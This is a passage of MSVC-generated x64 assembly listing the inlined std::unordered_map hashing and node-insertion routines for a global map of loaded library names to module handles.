?_Rehash_for_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Rehash_for_1, COMDAT

; 1655 :     void _Rehash_for_1() {

$LN22:
	sub	rsp, 40					; 00000028H

; 1656 :         const auto _Oldsize = _List._Mypair._Myval2._Mysize;
; 1657 :         const auto _Newsize = _Oldsize + 1;

	mov	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16

; 1681 :         return static_cast<size_type>(_CSTD ceilf(static_cast<float>(_For_size) / max_load_factor()));

	xorps	xmm0, xmm0

; 1656 :         const auto _Oldsize = _List._Mypair._Myval2._Mysize;
; 1657 :         const auto _Newsize = _Oldsize + 1;

	add	rcx, 1

; 1681 :         return static_cast<size_type>(_CSTD ceilf(static_cast<float>(_For_size) / max_load_factor()));

	js	SHORT $LN18@Rehash_for
	cvtsi2ss xmm0, rcx
	jmp	SHORT $LN19@Rehash_for
$LN18@Rehash_for:
	mov	rax, rcx
	and	ecx, 1
	shr	rax, 1
	or	rax, rcx
	cvtsi2ss xmm0, rax
	addss	xmm0, xmm0
$LN19@Rehash_for:
	divss	xmm0, DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	call	ceilf
	movss	xmm1, DWORD PTR __real@5f000000
	xor	ecx, ecx
	comiss	xmm0, xmm1
	jb	SHORT $LN17@Rehash_for
	subss	xmm0, xmm1
	comiss	xmm0, xmm1
	jae	SHORT $LN17@Rehash_for
	mov	rax, -9223372036854775808		; 8000000000000000H
	mov	rcx, rax
$LN17@Rehash_for:

; 1687 :         if (_Old_buckets >= _Req_buckets) {

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56

; 1681 :         return static_cast<size_type>(_CSTD ceilf(static_cast<float>(_For_size) / max_load_factor()));

	cvttss2si rax, xmm0
	add	rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	mov	ecx, 8
	cmp	rax, rcx
	cmova	rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1687 :         if (_Old_buckets >= _Req_buckets) {

	cmp	rdx, rcx
	jae	SHORT $LN3@Rehash_for

; 1688 :             // we already have enough buckets so there's no need to change the count
; 1689 :             return _Old_buckets;
; 1690 :         }
; 1691 : 
; 1692 :         if (_Old_buckets < 512 && _Old_buckets * 8 >= _Req_buckets) {

	cmp	rdx, 512				; 00000200H
	jae	SHORT $LN5@Rehash_for
	lea	rdx, QWORD PTR [rdx*8]
	cmp	rdx, rcx
	jae	SHORT $LN3@Rehash_for
$LN5@Rehash_for:

; 1693 :             // if we are changing the bucket count and have less than 512 buckets, use 8x more buckets
; 1694 :             return _Old_buckets * 8;
; 1695 :         }
; 1696 : 
; 1697 :         // power of 2 invariant means this will result in at least 2*_Old_buckets after round up in _Forced_rehash
; 1698 :         return _Req_buckets;

	mov	rdx, rcx
$LN3@Rehash_for:

; 1659 :     }

	add	rsp, 40					; 00000028H

; 1658 :         _Forced_rehash(_Desired_grow_bucket_count(_Newsize));

	jmp	?_Forced_rehash@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAX_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Forced_rehash
?_Rehash_for_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Rehash_for_1
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Check_rehash_required_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_NXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Check_rehash_required_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_NXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Check_rehash_required_1, COMDAT

; 1650 :         const size_type _Oldsize = _List._Mypair._Myval2._Mysize;
; 1651 :         const auto _Newsize      = _Oldsize + 1;

	mov	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16

; 1652 :         return max_load_factor() < static_cast<float>(_Newsize) / static_cast<float>(bucket_count());

	xorps	xmm0, xmm0
	add	rcx, 1
	js	SHORT $LN9@Check_reha
	cvtsi2ss xmm0, rcx
	jmp	SHORT $LN10@Check_reha
$LN9@Check_reha:
	mov	rax, rcx
	and	ecx, 1
	shr	rax, 1
	or	rax, rcx
	cvtsi2ss xmm0, rax
	addss	xmm0, xmm0
$LN10@Check_reha:
	mov	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56
	xorps	xmm1, xmm1
	test	rcx, rcx
	js	SHORT $LN7@Check_reha
	cvtsi2ss xmm1, rcx
	divss	xmm0, xmm1
	comiss	xmm0, DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	seta	al

; 1653 :     }

	ret	0
$LN7@Check_reha:

; 1652 :         return max_load_factor() < static_cast<float>(_Newsize) / static_cast<float>(bucket_count());

	mov	rax, rcx
	and	ecx, 1
	shr	rax, 1
	or	rax, rcx
	cvtsi2ss xmm1, rax
	addss	xmm1, xmm1
	divss	xmm0, xmm1
	comiss	xmm0, DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	seta	al

; 1653 :     }

	ret	0
?_Check_rehash_required_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_NXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Check_rehash_required_1
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Check_max_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAXXZ
_TEXT	SEGMENT
this$dead$ = 48
?_Check_max_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAXXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Check_max_size, COMDAT

; 1642 :     void _Check_max_size() const {

$LN7:
	sub	rsp, 40					; 00000028H

; 1643 :         const size_type _Oldsize = _List._Mypair._Myval2._Mysize;
; 1644 :         if (_Oldsize == _List.max_size()) {

	mov	rax, 329406144173384850			; 0492492492492492H
	cmp	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16, rax
	je	SHORT $LN6@Check_max_

; 1646 :         }
; 1647 :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN6@Check_max_:

; 1645 :             _Xlength_error("unordered_map/set too long");

	lea	rcx, OFFSET FLAT:??_C@_0BL@GOIGLPKN@unordered_map?1set?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
	int	3
$LN4@Check_max_:
?_Check_max_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAXXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Check_max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Insert_new_node_before@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_KQEAU32@1@Z
_TEXT	SEGMENT
this$dead$ = 8
_Hashval$ = 16
_Insert_before$ = 24
_Newnode$ = 32
?_Insert_new_node_before@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_KQEAU32@1@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Insert_new_node_before, COMDAT

; 1612 :         const _Nodeptr _Insert_after = _Insert_before->_Prev;

	mov	r10, QWORD PTR [r8+8]

; 1613 :         ++_List._Mypair._Myval2._Mysize;

	inc	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16

; 1614 :         _Construct_in_place(_Newnode->_Next, _Insert_before);

	mov	QWORD PTR [r9], r8

; 1615 :         _Construct_in_place(_Newnode->_Prev, _Insert_after);

	mov	QWORD PTR [r9+8], r10

; 1616 :         _Insert_after->_Next  = _Newnode;

	mov	QWORD PTR [r10], r9

; 1617 :         _Insert_before->_Prev = _Newnode;

	mov	QWORD PTR [r8+8], r9

; 1618 : 
; 1619 :         const auto _Head                = _List._Mypair._Myval2._Myhead;
; 1620 :         const auto _Bucket_array        = _Vec._Mypair._Myval2._Myfirst;
; 1621 :         const size_type _Bucket         = _Hashval & _Mask;

	and	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1622 :         _Unchecked_iterator& _Bucket_lo = _Bucket_array[_Bucket << 1];

	shl	rdx, 4
	add	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24

; 1623 :         _Unchecked_iterator& _Bucket_hi = _Bucket_array[(_Bucket << 1) + 1];
; 1624 :         if (_Bucket_lo._Ptr == _Head) {

	mov	rax, QWORD PTR [rdx]
	cmp	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	jne	SHORT $LN2@Insert_new

; 1625 :             // bucket is empty, set both
; 1626 :             _Bucket_lo._Ptr = _Newnode;

	mov	QWORD PTR [rdx], r9

; 1632 :             // new node is the highest element in the bucket
; 1633 :             _Bucket_hi._Ptr = _Newnode;
; 1634 :         }
; 1635 : 
; 1636 : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 1637 :         _Stl_internal_check_container_invariants();
; 1638 : #endif // _ENABLE_STL_INTERNAL_CHECK
; 1639 :         return _Newnode;
; 1640 :     }

	mov	rax, r9
	mov	QWORD PTR [rdx+8], r9
	ret	0
$LN2@Insert_new:

; 1627 :             _Bucket_hi._Ptr = _Newnode;
; 1628 :         } else if (_Bucket_lo._Ptr == _Insert_before) {

	cmp	rax, r8
	jne	SHORT $LN4@Insert_new

; 1629 :             // new node is the lowest element in the bucket
; 1630 :             _Bucket_lo._Ptr = _Newnode;

	mov	QWORD PTR [rdx], r9

; 1632 :             // new node is the highest element in the bucket
; 1633 :             _Bucket_hi._Ptr = _Newnode;
; 1634 :         }
; 1635 : 
; 1636 : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 1637 :         _Stl_internal_check_container_invariants();
; 1638 : #endif // _ENABLE_STL_INTERNAL_CHECK
; 1639 :         return _Newnode;
; 1640 :     }

	mov	rax, r9
	ret	0
$LN4@Insert_new:

; 1631 :         } else if (_Bucket_hi._Ptr == _Insert_after) {

	cmp	QWORD PTR [rdx+8], r10
	jne	SHORT $LN9@Insert_new

; 1632 :             // new node is the highest element in the bucket
; 1633 :             _Bucket_hi._Ptr = _Newnode;
; 1634 :         }
; 1635 : 
; 1636 : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 1637 :         _Stl_internal_check_container_invariants();
; 1638 : #endif // _ENABLE_STL_INTERNAL_CHECK
; 1639 :         return _Newnode;
; 1640 :     }

	mov	QWORD PTR [rdx+8], r9
$LN9@Insert_new:
	mov	rax, r9
	ret	0
?_Insert_new_node_before@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_KQEAU32@1@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Insert_new_node_before
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEBAAEBU?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ
_TEXT	SEGMENT
this$dead$ = 8
?_Get_first@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEBAAEBU?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ PROC ; std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>::_Get_first, COMDAT

; 1508 :         return *this;

	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A

; 1509 :     }

	ret	0
?_Get_first@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEBAAEBU?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ ENDP ; std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
